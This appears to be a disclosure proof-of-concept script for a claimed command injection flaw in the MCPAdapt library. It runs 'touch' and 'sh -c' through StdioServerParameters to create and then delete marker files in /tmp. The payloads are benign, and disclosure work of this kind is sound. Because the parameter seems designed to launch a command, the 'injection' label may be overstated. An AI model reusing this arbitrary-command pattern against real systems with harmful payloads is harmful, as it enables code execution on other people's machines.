#!/usr/bin/env python3
"""
🚨 MCPAdapt Command Injection Vulnerability PoC
Demonstrates command injection in MCPAdapt through StdioServerParameters
"""

import os
import sys
from pathlib import Path

# Add src path to import mcpadapt modules
sys.path.insert(0, str(Path(__file__).parent / "src"))

from mcp import StdioServerParameters
from mcpadapt.core import MCPAdapt, ToolAdapter
import mcp

class DummyAdapter(ToolAdapter):
    """Dummy adapter for PoC purposes"""
    def adapt(self, func, mcp_tool):
        return func

def demonstrate_command_injection():
    """Demonstrate command injection vulnerability in MCPAdapt"""
    
    print("🚨 MCPAdapt Command Injection Vulnerability Demonstration")
    print("=" * 60)
    
    # Test 1: Basic command injection via server_command
    print("\n[Test 1] Command injection via malicious server command:")
    malicious_command = "touch"
    malicious_args = ["/tmp/mcpadapt_command_injection_proof.txt"]
    
    try:
        # This will execute: touch /tmp/mcpadapt_command_injection_proof.txt
        server_params = StdioServerParameters(
            command=malicious_command,
            args=malicious_args
        )
        
        print(f"Executing: {malicious_command} {' '.join(malicious_args)}")
        
        with MCPAdapt(server_params, DummyAdapter()) as tools:
            print("✅ Command executed successfully!")
            
    except Exception as e:
        print(f"⚠️  Error occurred but command may have executed: {e}")
    
    # Verify the attack worked
    if os.path.exists("/tmp/mcpadapt_command_injection_proof.txt"):
        print("🚨 VULNERABILITY CONFIRMED: File created by injected command!")
        os.remove("/tmp/mcpadapt_command_injection_proof.txt")
    
    # Test 2: Command injection with shell metacharacters
    print("\n[Test 2] Command injection with shell metacharacters:")
    try:
        # This demonstrates more complex command injection
        server_params = StdioServerParameters(
            command="sh",
            args=["-c", "echo 'MCPAdapt vulnerability confirmed' > /tmp/mcpadapt_shell_injection.txt"]
        )
        
        print("Executing shell command injection...")
        
        with MCPAdapt(server_params, DummyAdapter()) as tools:
            print("✅ Shell command executed!")
            
    except Exception as e:
        print(f"⚠️  Error occurred but command may have executed: {e}")
    
    # Verify shell injection
    if os.path.exists("/tmp/mcpadapt_shell_injection.txt"):
        print("🚨 SHELL INJECTION CONFIRMED!")
        with open("/tmp/mcpadapt_shell_injection.txt", "r") as f:
            print(f"File contents: {f.read().strip()}")
        os.remove("/tmp/mcpadapt_shell_injection.txt")

if __name__ == "__main__":
    demonstrate_command_injection()